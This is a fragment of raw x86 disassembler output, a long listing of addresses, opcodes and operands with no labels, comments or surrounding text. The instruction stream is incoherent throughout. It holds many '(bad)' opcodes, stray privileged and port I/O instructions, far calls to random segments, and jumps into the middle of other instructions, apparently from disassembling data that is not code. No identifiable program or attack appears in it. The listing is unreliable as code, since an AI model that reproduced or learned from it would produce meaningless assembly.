  4145bf:	mov    WORD PTR [esi+0x16e7fbe1],fs
  4145c5:	je     0x4145dd
  4145c7:	lock ins DWORD PTR es:[edi],dx
  4145c9:	add    DWORD PTR ds:0xe8f3c3ac,ecx
  4145cf:	hlt    
  4145d0:	ins    DWORD PTR es:[edi],dx
  4145d1:	iret   
  4145d2:	push   eax
  4145d3:	sti    
  4145d4:	push   ebp
  4145d5:	inc    esp
  4145d6:	sbb    eax,0x8e9215dd
  4145db:	mov    dh,0xa9
  4145dd:	or     BYTE PTR [eax],0xac
  4145e0:	jle    0x41456e
  4145e2:	retf   0x3f24
  4145e5:	sbb    eax,0xf0f67ee8
  4145ea:	pop    edx
  4145eb:	lock add BYTE PTR [ebx+0x7b],dh
  4145ef:	cmp    DWORD PTR [ebx-0x5c],0x3671af4c
  4145f6:	pop    eax
  4145f7:	(bad)  
  4145f8:	xor    al,0x2d
  4145fa:	add    DWORD PTR [ecx+eax*4-0x4585c424],0xb0e73fc9
  414605:	mov    eax,0x7cc2c828
  41460a:	add    ebx,DWORD PTR ds:0x77769f3d
  414610:	mov    ds:0xd5c1d177,eax
  414615:	push   esp
  414616:	dec    edi
  414617:	jne    0x414632
  414619:	getsec 
  41461b:	arpl   WORD PTR [edx-0x1bb581f4],dx
  414621:	scas   eax,DWORD PTR es:[edi]
  414622:	mov    dh,0xb
  414624:	and    bh,dh
  414626:	mov    esi,0x4ef095d9
  41462b:	cmp    BYTE PTR [ebx-0x5819bb5e],ch
  414631:	inc    ebx
  414632:	enter  0xdc9f,0xbc
  414636:	pop    esp
  414637:	test   BYTE PTR gs:[eax+edi*4+0x5b4e258e],dl
  41463f:	dec    edi
  414640:	mov    edi,DWORD PTR [ebx]
  414642:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  414643:	data16 hlt 
  414645:	mov    ds:0x4a08db7f,eax
  41464a:	retf   
  41464b:	icebp  
  41464c:	xchg   eax,esi
  41464e:	scas   al,BYTE PTR es:[edi]
  41464f:	jmp    0x414649
  414651:	jns    0x41461d
  414653:	mov    ch,0xc7
  414655:	popf   
  414656:	std    
  414657:	xchg   ebp,eax
  414658:	in     eax,0x39
  41465a:	lahf   
  41465b:	sbb    bl,BYTE PTR [edi+edx*2-0x62]
  41465f:	pop    ebp
  414660:	sbb    al,0xc1
  414662:	push   0x69af66fe
  414667:	mov    al,0x8e
  414669:	push   0xbd631257
  41466e:	sbb    ebx,DWORD PTR [ecx+0x63]
  414671:	inc    eax
  414672:	outs   dx,DWORD PTR ds:[esi]
  414673:	cmc    
  414674:	xchg   al,al
  414676:	mov    ds:0x41f82113,eax
  41467b:	je     0x41461e
  41467d:	push   0xffffffd2
  41467f:	(bad)  
  414680:	mov    bh,0x68
  414682:	adc    DWORD PTR [edi+0x3ab1caf6],0xdfbacfc6
  41468c:	jnp    0x4146b2
  41468e:	add    eax,0x38d83cb
  414693:	out    0x18,eax
  414695:	sub    al,0xf8
  414697:	aam    0x28
  414699:	jb     0x414661
  41469b:	xor    al,bh
  41469d:	jge    0x4146da
  41469f:	out    dx,al
  4146a0:	inc    edx
  4146a1:	scas   eax,DWORD PTR es:[edi]
  4146a2:	pop    ebp
  4146a3:	cli    
  4146a4:	cmp    al,0xda
  4146a6:	mov    ds:0x8e7f6cbf,al
  4146ab:	mov    ch,0x1b
  4146ad:	das    
  4146ae:	mov    cs,edi
  4146b0:	retf   0xe707
  4146b3:	adc    edx,edi
  4146b5:	push   ebx
  4146b6:	dec    BYTE PTR [edx]
  4146b8:	in     al,0xec
  4146ba:	cmp    DWORD PTR es:[eax-0x46],0x12
  4146bf:	popa   
  4146c0:	adc    BYTE PTR [ebp+0x1d],al
  4146c3:	xor    esi,DWORD PTR [edi-0x38]
  4146c6:	fdiv   st,st(1)
  4146c8:	pop    edx
  4146c9:	or     eax,0x834723fe
  4146ce:	std    
  4146cf:	call   0x47b51fbc
  4146d4:	adc    DWORD PTR [esp+eiz*4-0x7012e6d9],0xd485cdd8
  4146df:	bnd jmp 0x4146f3
  4146e2:	mov    ds:0xf1b1cc1f,al
  4146e7:	sub    esi,esp
  4146e9:	into   
  4146ea:	add    bh,BYTE PTR [ebx+0x27]
  4146ed:	(bad)  
  4146ee:	xchg   edi,eax
  4146ef:	lods   eax,DWORD PTR ds:[esi]
  4146f0:	pop    esp
  4146f1:	xchg   esp,eax
  4146f2:	xchg   esi,eax
  4146f3:	stc    
  4146f4:	and    ecx,ecx
  4146f6:	xor    cl,BYTE PTR [edx+edx*4]
  4146f9:	jnp    0x4146db
  4146fb:	sbb    al,0x14
  4146fd:	dec    eax
  4146fe:	xor    dh,BYTE PTR [ebp+0x76]
  414701:	xor    eax,0x97f59e8
  414706:	xchg   BYTE PTR [ebp+0x9fdb76c],cl
  41470c:	push   0x73aeddcb
  414711:	or     DWORD PTR [ebp-0x7a],eax
  414714:	stos   BYTE PTR es:[edi],al
  414715:	(bad)  
  414716:	push   ebx
  414717:	iret   
  414718:	inc    edx
  414719:	pusha  
  41471a:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41471b:	mov    bh,0x1
  41471d:	frstor [ebx+ecx*1+0x7249f9e8]
  414724:	hlt    
  414725:	fxch   st(5)
  414727:	mov    ah,0xc0
  414729:	or     al,BYTE PTR [esi]
  41472b:	scas   al,BYTE PTR es:[edi]
  41472c:	mov    esi,0x88c1b6de
  414731:	adc    ebx,eax
  414733:	pop    ecx
  414734:	sub    eax,0x16f8fd8c
  414739:	and    al,ah
  41473b:	mov    bl,0xd0
  41473d:	(bad)  [eax]
  41473f:	out    dx,al
  414740:	sti    
  414741:	push   ecx
  414742:	push   ss
  414743:	add    BYTE PTR [edx+0xce39035],dh
  414749:	and    eax,0x9fe2f458
  41474e:	in     al,dx
  41474f:	in     al,0x28
  414751:	xchg   esp,eax
  414752:	pusha  
  414753:	les    eax,FWORD PTR [ebp-0x6dec12bc]
  414759:	dec    esp
  41475a:	pop    esp
  41475b:	popf   
  41475c:	mov    cl,0x95
  41475e:	push   eax
  41475f:	adc    edx,DWORD PTR [eax+ebp*8-0x8]
  414763:	inc    eax
  414764:	pop    ds
  414765:	push   0x38
  414767:	mov    DWORD PTR [ebx],edi
  414769:	ja     0x4146f5
  41476b:	jns    0x414796
  41476d:	mov    ah,dh
  41476f:	mov    esp,0x7ced7c0c
  414774:	push   cs
  414775:	sub    al,0x31
  414777:	push   ecx
  414778:	mov    ss,WORD PTR [ecx-0x394ce909]
  41477e:	add    DWORD PTR [ebx-0x3028845f],0x432d7ab0
  414788:	test   al,0xd6
  41478a:	popf   
  41478b:	test   eax,0x1cb32628
  414790:	ret    
  414791:	cmp    eax,0x2aeac93a
  414796:	ret    0xac9
  414799:	xor    ah,bh
  41479b:	jns    0x414777
  41479d:	dec    esp
  41479e:	or     eax,0x78a6e7f5
  4147a3:	xchg   esp,eax
  4147a4:	out    dx,al
  4147a5:	mov    esi,0xb6fd693a
  4147aa:	xor    DWORD PTR [ecx],ebx
  4147ac:	pop    ecx
  4147ad:	js     0x41474e
  4147af:	dec    esp
  4147b0:	dec    ebx
  4147b1:	mov    esp,0x1b7fa16b
  4147b6:	mov    DWORD PTR [edi-0x7a],eax
  4147b9:	fdiv   DWORD PTR [esi+esi*4-0x36]
  4147bd:	inc    ecx
  4147be:	xchg   edx,eax
  4147bf:	mov    esi,0x1cee8ead
  4147c4:	loope  0x4147fa
  4147c6:	xor    al,BYTE PTR [ebx*2-0x355b5448]
  4147cd:	xchg   esi,eax
  4147ce:	shl    ah,cl
  4147d0:	lds    edi,FWORD PTR [ecx+0x28b10f3b]
  4147d6:	xchg   ebx,eax
  4147d7:	mov    bh,0xc9
  4147d9:	jecxz  0x4147b4
  4147db:	in     eax,0x78
  4147dd:	call   0x7aed:0x4a54cfa5
  4147e4:	xor    BYTE PTR [ebx],cl
  4147e6:	mov    edi,0x5c0ce3d1
  4147eb:	xor    al,ch
  4147ed:	into   
  4147ee:	push   ebx
  4147ef:	pop    edi
  4147f0:	jmp    0x4bdc:0x430fc092
  4147f7:	out    0x2,eax
  4147f9:	les    esp,FWORD PTR [ebx]
  4147fb:	mov    dl,0x9c
  4147fd:	pop    esp
  4147fe:	leave  
  4147ff:	fwait
  414800:	jle    0x414816
  414802:	repz or ah,dh
  414805:	lods   al,BYTE PTR ds:[esi]
  414806:	call   0x3ff4:0x7488b214
  41480d:	pop    edx
  41480e:	lea    ecx,[ebp+0x3]
  414811:	adc    eax,0xad219719
  414816:	inc    esi
  414817:	adc    DWORD PTR [edi],edi
  414819:	scas   eax,DWORD PTR es:[edi]
  41481a:	pop    es
  41481b:	ror    edi,1
  41481d:	aam    0xf4
  41481f:	pop    ecx
  414820:	data16 fsub QWORD PTR [ecx+0x16]
  414824:	and    al,0xc4
  414826:	rcr    BYTE PTR [esi-0x458d95fc],cl
  41482c:	inc    edi
  41482d:	sbb    ah,BYTE PTR [edx+0x9]
  414830:	dec    ebx
  414831:	dec    eax
  414832:	cmp    bl,dh
  414834:	xlat   BYTE PTR ds:[ebx]
  414835:	hlt    
  414836:	cmp    al,0xc
  414838:	mov    ch,0x29
  41483a:	push   cs
  41483b:	push   eax
  41483c:	dec    esi
  41483d:	xor    ebp,DWORD PTR [eax+0x1b28d70c]
  414843:	jb     0x4148b9
  414845:	lods   eax,DWORD PTR ds:[esi]
  414846:	xchg   edi,eax
  414847:	sbb    edx,DWORD PTR ds:0x81ca1a14
  41484d:	leave  
  41484e:	sub    esp,eax
  414850:	dec    edi
  414851:	int3   
  414852:	pushf  
  414853:	out    0xd4,eax
  414855:	std    
  414856:	push   0xec2e3d0
  41485b:	xor    BYTE PTR [esi-0x1b9f288c],0x29
  414862:	jle    0x414832
  414864:	push   0x52
  414866:	aas    
  414867:	mov    edx,0xa35f5f8
  41486c:	(bad)  
  41486d:	jns    0x41486e
  41486f:	ja     0x41480c
  414871:	and    ebp,DWORD PTR [eax+eiz*2]
  414874:	or     al,0x52
  414876:	mov    ecx,0xd6d8db89
  41487b:	jbe    0x4148cd
  41487d:	dec    edx
  41487e:	mov    edx,0x61e8dc44
  414883:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  414884:	xchg   DWORD PTR [edi+eiz*2+0x27e28f1a],eax
  41488b:	pop    eax
  41488c:	mov    edi,0xbbe304e1
  414891:	dec    esp
  414892:	das    
  414893:	push   cs
  414894:	sbb    eax,0xc8e1a4e7
  414899:	(bad)  
  41489a:	test   DWORD PTR [ebp+eiz*4+0x12],0x15d5774e
  4148a2:	lds    edx,FWORD PTR [edx+ecx*8-0x69]
  4148a6:	repz inc ebx
  4148a8:	shl    edi,cl
  4148aa:	add    ebp,0xffffffc2
  4148ad:	shr    BYTE PTR [esi-0x5f],cl
  4148b0:	pop    esp
  4148b1:	ror    al,1
  4148b3:	mov    ebp,0xb2e5abae
  4148b8:	sbb    dh,bl
  4148ba:	xchg   ecx,eax
  4148bb:	retf   0xb04e
  4148be:	mov    DWORD PTR ds:0x116d,ecx
  4148c3:	scas   al,BYTE PTR es:[edi]
  4148c4:	jp     0x4148d7
  4148c6:	add    dh,BYTE PTR [ecx-0x5793a48]
  4148cc:	cld    
  4148cd:	sub    DWORD PTR [ebx-0x1a7501ba],ecx
  4148d3:	rol    BYTE PTR [esi-0x23],cl
  4148d6:	out    dx,al
  4148d7:	std    
  4148d8:	fwait
  4148d9:	cmp    eax,0x60dc38e8
  4148de:	adc    al,cl
  4148e0:	xor    ecx,DWORD PTR [ecx-0x28bff3ad]
  4148e6:	in     eax,dx
  4148e7:	mov    bh,0x23
  4148e9:	or     eax,0xe50db9a7
  4148ee:	scas   al,BYTE PTR es:[edi]
  4148ef:	mov    bh,0xba
  4148f1:	fisub  DWORD PTR [ecx+0x2]
  4148f4:	sub    dl,BYTE PTR [ecx]
  4148f6:	retf   
  4148f7:	mov    edi,0x2434e9ba
  4148fc:	sub    al,BYTE PTR [ecx+eax*8+0x50102a18]
  414903:	xchg   edi,eax
  414904:	gs jmp 0xfa2d:0xa9ea405
  41490c:	je     0x4148e9
  41490e:	dec    ebp
  41490f:	mov    DWORD PTR [ebp+0xd],esi
  414912:	imul   ecx,DWORD PTR [edx-0x28bd4bcb],0xd41e4a6e
  41491c:	in     al,dx
  41491d:	in     al,0x43
  41491f:	jmp    0x81fd0646
  414924:	faddp  st(5),st
  414926:	lea    eax,[edi]
  414928:	stc    
  414929:	xlat   BYTE PTR ds:[ebx]
  41492a:	xchg   esp,eax
  41492b:	inc    esi
  41492c:	pushf  
  41492d:	pop    esi
  41492e:	(bad)  [ebx-0x23d29460]
  414934:	loope  0x4148f2
  414936:	in     al,dx
  414937:	test   BYTE PTR [eax+0x1],0x43
  41493b:	je     0x41499e
  41493d:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41493e:	rcr    BYTE PTR [edi],1
  414940:	or     DWORD PTR [eax+eax*4-0x32],0xffffffc0
  414945:	push   ebx
  414946:	xor    eax,edi
  414948:	mov    cl,0x2
  41494a:	push   cs
  41494b:	mov    eax,0x327c3ac8
  414950:	not    DWORD PTR [edi+0x52]
  414953:	jp     0x414921
  414955:	mov    bl,0x3c
  414957:	sbb    eax,0x2dde3c3b
  41495c:	and    DWORD PTR [edx],ebp
  41495e:	mov    ds:0xd0be9e3,al
  414963:	(bad)  
  414964:	aas    
  414965:	ret    0xb67b
  414968:	call   0xdb91:0xa32c885d
  41496f:	in     al,dx
  414970:	or     eax,DWORD PTR [ebx-0x78f79ac]
  414976:	or     DWORD PTR [ebp+0x35],ebp
  414979:	popf   
  41497a:	cmp    BYTE PTR [ebx+0xb0e406],cl
  414980:	xor    BYTE PTR [ecx+0x797fbb49],0x7f
  414987:	jge    0x41499d
  414989:	mov    ebp,0x9eaab38f
  41498e:	or     al,0x5e
  414990:	inc    edi
  414991:	xchg   ebp,eax
  414992:	push   esi
  414993:	out    dx,al
  414994:	mov    eax,0xd26601cf
  414999:	fadd   QWORD PTR [edi+0x59]
  41499c:	mov    eax,DWORD PTR [edx-0x42]
  41499f:	imul   DWORD PTR [ebp+0x281adb03]
  4149a5:	or     al,BYTE PTR [edi+0x329007f2]
  4149ab:	or     esp,esp
  4149ad:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4149ae:	and    bl,BYTE PTR [ecx+eiz*1-0x19]
  4149b2:	leave  
  4149b3:	sbb    al,0xe9
  4149b5:	sub    BYTE PTR [esi],bh
  4149b7:	inc    esp
  4149b8:	mov    al,0xdd
  4149ba:	pop    esp
  4149bb:	fisttp QWORD PTR [edx]
  4149bd:	adc    ebp,esi
  4149bf:	into   
  4149c0:	leave  
  4149c1:	shl    DWORD PTR [ebx+0x54],cl
  4149c4:	pop    edx
  4149c5:	jns    0x4149c9
  4149c7:	dec    ebp
  4149c8:	dec    edx
  4149c9:	and    DWORD PTR [ecx],eax
  4149cb:	arpl   WORD PTR [edi+0x23],bx
  4149ce:	xor    ah,BYTE PTR [ebp-0x563eb2ad]
  4149d4:	lods   al,BYTE PTR ds:[esi]
  4149d5:	stc    
  4149d6:	and    dl,0xfa
  4149d9:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4149da:	mov    ecx,0x7a23e41a
  4149df:	mov    esi,0x48e0d5af
  4149e4:	mov    al,0x16
  4149e6:	inc    edx
  4149e7:	arpl   WORD PTR [edx-0x49d9d58b],si
  4149ed:	mov    bh,0x20
  4149ef:	mov    esi,0x7139ddf4
  4149f4:	push   0x3c
  4149f6:	sahf   
  4149f7:	jo     0x414a62
  4149f9:	push   ds
  4149fa:	imul   edx,edx,0x97f41933
  414a00:	lea    eax,[esi]
  414a02:	jb     0x4149c9
  414a04:	adc    al,0xcf
  414a06:	dec    ebp
  414a07:	push   cs
  414a08:	or     bh,dl
  414a0a:	add    ebx,ecx
  414a0c:	ds nop
  414a0e:	fdivrp st(1),st
  414a10:	retf   
  414a11:	pop    ss
  414a12:	mov    cl,0xb8
  414a14:	xchg   bh,ah
  414a16:	xchg   edx,eax
  414a17:	dec    ebp
  414a18:	es dec eax
  414a1a:	rcl    BYTE PTR [esi+edi*2],1
  414a1d:	mov    ecx,0x530943a2
  414a22:	or     DWORD PTR [ebx+0x56137f93],edx
  414a28:	stos   BYTE PTR es:[edi],al
  414a29:	and    al,0xed
  414a2b:	stc    
  414a2c:	rcl    ah,cl
  414a2e:	and    dl,bl
  414a30:	mov    bl,0xd7
  414a32:	inc    edx
  414a33:	xchg   ecx,eax
  414a34:	sub    dh,BYTE PTR [eax]
  414a36:	xchg   esp,eax
  414a37:	mov    ebx,0x5e437b86
  414a3c:	cwde   
  414a3d:	cmp    bh,BYTE PTR [esi]
  414a3f:	jle    0x414a1a
  414a41:	nop
  414a42:	mov    BYTE PTR [ebx-0x7c5097ca],dh
  414a48:	pop    ds
  414a49:	adc    esp,edx
  414a4b:	into   
  414a4c:	jecxz  0x414a48
  414a4e:	push   edi
  414a4f:	dec    edi
  414a50:	shl    ah,1
  414a52:	retf   0xda1e
  414a55:	inc    edi
  414a56:	retf   
  414a57:	ret    
  414a58:	sar    DWORD PTR [edx+0x4a],cl
  414a5b:	mov    esp,esp
  414a5d:	sub    edi,DWORD PTR [eax]
  414a5f:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  414a60:	ja     0x414a4c
  414a62:	inc    esp
  414a63:	popf   
  414a64:	or     ah,bh
  414a66:	daa    
  414a67:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  414a68:	retf   0x1d78
  414a6b:	mov    ebp,DWORD PTR [edi-0x7b]
  414a6e:	(bad)
  414a72:	enter  0x9ba,0x7
  414a76:	popa   
  414a77:	jg     0x414ab3
  414a79:	fwait
  414a7a:	call   0xf17a:0xf49b70d7
  414a81:	in     eax,0x60
  414a83:	stos   DWORD PTR es:[di],eax
  414a85:	neg    BYTE PTR [esi]
  414a87:	je     0x414a63
  414a89:	inc    ebx
  414a8a:	aaa    
  414a8b:	sub    eax,0x26d31e6f
  414a90:	adc    ebx,DWORD PTR [edi-0x58412d1b]
  414a96:	xlat   BYTE PTR ds:[ebx]
  414a97:	bound  eax,QWORD PTR ss:0x8c80f85a
  414a9e:	fsubr  st(6),st
  414aa0:	pushf  
  414aa1:	and    al,0xc5
  414aa3:	mov    ebp,0xaaa185b
  414aa8:	cmp    dh,dh
  414aaa:	jb     0x414ae4
  414aac:	pop    edi
  414aad:	adc    al,0x24
  414aaf:	and    edx,DWORD PTR [ecx+0x74ffa2ab]
  414ab5:	scas   al,BYTE PTR es:[edi]
  414ab6:	add    DWORD PTR [esi-0x38],0xd
  414aba:	and    esp,esi
  414abc:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  414abd:	or     bh,bl
  414abf:	mov    ebx,DWORD PTR [edi]
  414ac1:	not    edx
  414ac3:	mov    esp,ebx
  414ac5:	mov    cl,0x3d
  414ac7:	test   al,0xc2
  414ac9:	dec    esp
  414aca:	push   cs
  414acb:	aam    0xa3
  414acd:	xor    edx,DWORD PTR [edi]
  414acf:	aas    
  414ad0:	inc    ecx
  414ad1:	jns    0x414b3f
  414ad3:	fimul  WORD PTR [eax*8-0x59c49ce9]
  414ada:	cwde   
  414adb:	add    eax,ecx
  414add:	outs   dx,BYTE PTR ds:[esi]
  414ade:	xchg   esi,eax
  414adf:	pop    esi
  414ae0:	push   ds
  414ae1:	(bad)  
  414ae2:	or     DWORD PTR [ecx],ebx
  414ae4:	imul   DWORD PTR [eax+0x71]
  414ae7:	cmp    DWORD PTR [esi-0x20],0xfffffff9
  414aeb:	push   eax
  414aec:	ins    DWORD PTR es:[edi],dx
  414aed:	mov    esi,0xf43cf668
  414af2:	inc    edi
  414af3:	cmc    
  414af4:	push   ds
  414af5:	mov    ebp,0xa2f756f2
  414afa:	mov    al,BYTE PTR [edi+0x62]
  414afd:	pop    ss
  414afe:	xchg   esp,eax
  414aff:	mov    esp,0xcf899d9
  414b04:	sbb    DWORD PTR [eax+0x2c],esp
  414b07:	jmp    0x828872d2
  414b0c:	mov    cl,BYTE PTR [ecx-0x3]
  414b0f:	mov    dl,0x97
  414b11:	cmp    bh,BYTE PTR [edi]
  414b13:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  414b14:	scas   al,BYTE PTR es:[edi]
  414b15:	ret    0x7c1
  414b18:	xlat   BYTE PTR ds:[ebx]
  414b19:	pop    edx
  414b1a:	fidiv  DWORD PTR [ebx]
  414b1c:	pusha  
  414b1d:	stc    
  414b1e:	outs   dx,DWORD PTR ds:[esi]
  414b1f:	mov    DWORD PTR ds:0xc0dba0b0,ebp
  414b25:	das    
  414b26:	stos   BYTE PTR es:[edi],al
  414b27:	push   esi
  414b28:	and    ah,BYTE PTR [esi-0x9]
  414b2b:	sub    al,0x68
  414b2d:	int3   
  414b2e:	loopne 0x414afa
  414b30:	xor    DWORD PTR [esp+ebp*4+0x10],ebp
  414b34:	pop    ds
  414b35:	fdivr  QWORD PTR [ecx]
  414b37:	inc    ebx
  414b38:	pop    es
  414b39:	pop    esi
  414b3a:	pop    esi
  414b3b:	mov    edi,0x7bd6d169
  414b40:	(bad)  [edi]
  414b42:	adc    eax,DWORD PTR [edx+0x5a]
  414b45:	sbb    DWORD PTR [ebx+0x23],esi
  414b48:	shr    BYTE PTR [edx+eiz*1-0x40],cl
  414b4c:	pop    edx
  414b4d:	(bad)  
  414b4e:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  414b4f:	mov    cs,WORD PTR [ebx]
  414b51:	aaa    
  414b52:	inc    edi
  414b53:	add    edx,DWORD PTR [edx]
  414b55:	push   ss
  414b56:	sar    BYTE PTR [ecx],cl
  414b58:	sbb    al,0xbb
  414b5a:	jns    0x414b6b
  414b5c:	adc    ah,BYTE PTR [esi+0x6f]
  414b5f:	xchg   DWORD PTR [esp+ebp*1-0x2860ec02],ecx
  414b66:	ret    0xc762
  414b69:	and    BYTE PTR [ebp+0x243b7a51],al
  414b6f:	dec    ax
  414b71:	aaa    
  414b72:	dec    ebx
  414b73:	dec    esi
  414b74:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  414b75:	and    DWORD PTR [ebp+0x7f],esp
  414b78:	sub    al,0x66
  414b7a:	dec    esp
  414b7b:	or     esi,eax
  414b7d:	sub    BYTE PTR [edi],cl
  414b7f:	sti    
  414b80:	push   ds
  414b81:	mov    WORD PTR [esi],cs
  414b83:	xor    eax,0xf5b4f511
  414b88:	cmp    edx,DWORD PTR [ecx+edi*4+0xf]
  414b8c:	adc    bh,BYTE PTR [ecx]
  414b8e:	into   
  414b8f:	mov    ds:0x77d973bd,eax
  414b94:	div    BYTE PTR [ecx+ebp*8]
  414b97:	das    
  414b98:	sub    eax,0x41efffed
  414b9d:	scas   eax,DWORD PTR es:[edi]
  414b9e:	in     eax,0xa2
  414ba0:	out    dx,eax
  414ba1:	(bad)  
  414ba4:	cmp    BYTE PTR [edi],bl
  414ba6:	add    bh,BYTE PTR [edx+0x3eddbeb1]
  414bac:	adc    eax,0x520f0e03
  414bb1:	nop
  414bb2:	fstp   QWORD PTR [edi]
  414bb4:	outs   dx,BYTE PTR ds:[esi]
  414bb5:	(bad)  
  414bb6:	popa   
  414bb7:	cmp    edx,DWORD PTR [edx-0x62575951]
  414bbd:	pop    esp
  414bbe:	mov    bh,0x71
  414bc0:	(bad)  
  414bc1:	pop    es
  414bc2:	cmp    al,0x14
  414bc4:	xor    ah,BYTE PTR [esi+0x76e25154]
  414bca:	adc    ebx,esp
  414bcc:	(bad)  
  414bcd:	and    al,0x24
  414bcf:	adc    eax,0x7a54ac3a
  414bd4:	pop    edi
  414bd5:	jecxz  0x414ba5
  414bd7:	adc    esp,DWORD PTR [eax-0x51]
  414bda:	cmp    DWORD PTR [esi+esi*1],edx
  414bdd:	cdq    
  414bde:	retf   
  414bdf:	sub    bh,bh
  414be1:	xchg   esp,eax
  414be2:	push   0x33
  414be4:	adc    DWORD PTR [ebp+0x4b],0xb7275144
  414beb:	inc    edi
  414bec:	inc    ecx
  414bed:	sar    ch,0x1a
  414bf0:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  414bf1:	je     0x414bff
  414bf3:	cmp    esi,DWORD PTR [esi-0x7b]
  414bf6:	sbb    eax,0x292dfe99
  414bfb:	add    esp,DWORD PTR [eax]
  414bfd:	lock or ah,BYTE PTR [ebp+eiz*8+0x757352ca]
  414c05:	dec    eax
  414c06:	mov    esp,0xc00bef7f
  414c0b:	xor    BYTE PTR [edi],0x88
  414c0e:	inc    esi
  414c0f:	cmp    al,0x83
  414c11:	hlt    
  414c12:	out    dx,al
  414c13:	test   BYTE PTR [edi],al
  414c15:	gs std 
  414c17:	push   cs
  414c18:	(bad)  
  414c19:	adc    edi,esp
  414c1b:	sbb    al,0x37
  414c1d:	outs   dx,DWORD PTR ds:[esi]
  414c1e:	or     eax,eax
  414c20:	jecxz  0x414c16
  414c22:	test   ah,bh
  414c24:	push   edi
  414c25:	mov    ah,dh
  414c27:	call   0xee22465
  414c2c:	push   ebp
  414c2d:	aad    0x42
  414c2f:	or     edi,ecx
  414c31:	push   ebx
  414c32:	mov    ds:0x5edf6bce,eax
  414c37:	sbb    DWORD PTR [edx-0x66],0x34fdc180
  414c3e:	pusha  
  414c3f:	cld    
  414c40:	pop    edx
  414c41:	sahf   
  414c42:	ja     0x414c3a
  414c44:	sahf   
  414c45:	(bad)  
  414c47:	imul   esi,DWORD PTR [ebp-0x55ac941a],0xffffffdb
  414c4e:	xlat   BYTE PTR ds:[ebx]
  414c4f:	mov    BYTE PTR [eax+esi*4+0x4b],0x2b
  414c54:	inc    esp
  414c55:	popa   
  414c56:	xchg   DWORD PTR [ecx+0x4c],ebx
  414c59:	add    DWORD PTR [edx-0x1f0f8a47],ecx
  414c5f:	fst    st(2)
  414c61:	sbb    BYTE PTR [edx-0x2038ba4c],bh
  414c67:	push   esi
  414c68:	mov    dh,0xea
  414c6a:	ror    DWORD PTR [ebp+esi*4+0x1fae1f64],0x79
  414c72:	pop    ds
  414c73:	add    eax,DWORD PTR [edx+0x3d302ca8]
  414c79:	sar    BYTE PTR [edi-0x1c],1
  414c7c:	cs into 
  414c7e:	imul   esi,DWORD PTR [ebx+0x64],0xffffffe2
  414c82:	dec    ebx
  414c83:	pusha  
  414c84:	mov    al,ds:0xa878f2f3
  414c89:	and    eax,DWORD PTR cs:[ebp+0x26570ec9]
  414c90:	rcl    DWORD PTR [eax],cl
  414c92:	in     al,0x77
  414c94:	sbb    dh,BYTE PTR [ecx-0x5]
  414c97:	mov    es,WORD PTR [eax+0x39777763]
  414c9d:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  414c9e:	push   es
  414c9f:	shl    BYTE PTR [ecx],0x73
  414ca2:	inc    esp
  414ca3:	sbb    BYTE PTR [edi-0x43],0x4e
  414ca7:	pop    esp
  414ca8:	into   
  414ca9:	pop    ecx
  414caa:	hlt    
  414cab:	inc    ebp
  414cac:	pop    ebx
  414cad:	inc    ebx
  414cae:	std    
  414caf:	cwde   
  414cb0:	scas   al,BYTE PTR es:[edi]
  414cb1:	out    0xd1,al
  414cb3:	mov    ds:0xa5290e05,al
  414cb8:	lods   al,BYTE PTR ds:[esi]
  414cb9:	add    dl,ch
  414cbb:	bound  edi,QWORD PTR [ebp+0x5f0d1624]
  414cc1:	lock popa 
  414cc3:	sub    al,al
  414cc5:	inc    esi
  414cc6:	mov    gs,WORD PTR [eax+ebx*1]
  414cc9:	inc    ebx
  414cca:	pop    edi
  414ccb:	pop    ds
  414ccc:	test   DWORD PTR [ebp+0x36],edx
  414ccf:	inc    ebp
  414cd0:	outs   dx,DWORD PTR ds:[esi]
  414cd1:	mov    ecx,0x6aa6d676
  414cd6:	aad    0x19
  414cd8:	add    al,0xea
  414cda:	scas   eax,DWORD PTR es:[edi]
  414cdb:	cmp    eax,0xdebd89b6
  414ce0:	out    0x71,al
  414ce2:	lahf   
  414ce3:	xor    ebp,DWORD PTR [esi]
  414ce5:	add    eax,0xf193ec06
  414cea:	rcl    dh,cl
  414cec:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  414ced:	test   BYTE PTR [ebx],al
  414cef:	jbe    0x414c7d
  414cf1:	xchg   BYTE PTR [edx],cl
  414cf3:	mov    eax,ecx
  414cf5:	fiadd  DWORD PTR [edx-0x11]
  414cf8:	ss xlat BYTE PTR cs:[ebx]
  414cfb:	adc    ah,BYTE PTR [ebp+0x26]
  414cfe:	in     al,0x39
  414d00:	aaa    
  414d01:	addr16 mov dl,0x46
  414d04:	xchg   ebx,edi
  414d06:	in     al,0x5e
  414d08:	push   0xd197266d
  414d0d:	mov    cl,0xbb
  414d0f:	and    ecx,esi
  414d11:	mov    ds:0x7838afe4,eax
  414d16:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  414d17:	loop   0x414d39
  414d19:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  414d1a:	adc    BYTE PTR [eax-0x7],0xad
  414d1e:	xor    BYTE PTR [edi+0x3f],0x48
  414d22:	xor    ecx,DWORD PTR [ebx+0x18]
  414d25:	stos   BYTE PTR es:[edi],al
  414d26:	jae    0x414cc9
  414d28:	pop    ebx
  414d29:	pop    ds
  414d2a:	fdivr  QWORD PTR [edi+ecx*2]
  414d2d:	int    0x42
  414d2f:	sub    DWORD PTR [ecx],0xd8ee9e54
  414d35:	sub    al,0x76
  414d37:	fnstenv [edx-0x7b]
  414d3a:	sbb    edi,DWORD PTR [edx]
  414d3c:	jae    0x414d43
  414d3e:	add    DWORD PTR [esi],0x9
  414d41:	icebp  
  414d42:	dec    edx
  414d43:	rol    BYTE PTR [esi-0x75e76cb2],0xfb
